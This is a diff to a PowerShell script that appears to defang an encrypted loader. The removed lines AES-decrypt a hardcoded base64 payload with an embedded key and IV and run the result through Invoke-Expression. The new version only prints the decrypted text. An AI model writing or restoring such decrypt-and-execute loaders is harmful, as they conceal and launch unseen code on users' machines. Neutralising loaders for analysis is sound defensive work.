@@ -1,20 +1,15 @@
-function D {
-    param($e, $k, $i)
-    $a = [System.Security.Cryptography.Aes]::Create()
-    $a.Key = $k
-    $a.IV = $i
-    $a.Padding = "PKCS7"
-    $d = $a.CreateDecryptor()
-    $b = [Convert]::FromBase64String($e)
-    $m = New-Object IO.MemoryStream
-    $c = New-Object Security.Cryptography.CryptoStream($m, $d, 'Write')
-    $c.Write($b, 0, $b.Length)
-    $c.Close()
-    [Text.Encoding]::UTF8.GetString($m.ToArray())
-}
-
 $k = [Convert]::FromBase64String("CKUQXurBkno1LFqfHsffMITHjZLaNyS8qV29Ji49wzM=")
 $i = [Convert]::FromBase64String("LF8fHjkRprgmJE7UiyOr1A==")
 $p = "ZpSwhcS8WakrWT0vyb9IS3PhL9R/051dyLUZBgnpC+Ql92gtj9yoZl9BnZz+rpKzcOwdW2I1j7pgMOQGydO4H5QoHZrQ7vwkHHroVxLsQtFiet5Ug0eSwqjXaL3WGSlRHyAjEVclsujZrPIC1Gemzg=="
 
-iex (D $p $k $i)
+$a = [System.Security.Cryptography.Aes]::Create()
+$a.Key = $k
+$a.IV = $i
+$a.Padding = "PKCS7"
+$d = $a.CreateDecryptor()
+$b = [Convert]::FromBase64String($p)
+$m = New-Object IO.MemoryStream
+$c = New-Object Security.Cryptography.CryptoStream($m, $d, 'Write')
+$c.Write($b, 0, $b.Length)
+$c.Close()
+[Text.Encoding]::UTF8.GetString($m.ToArray())
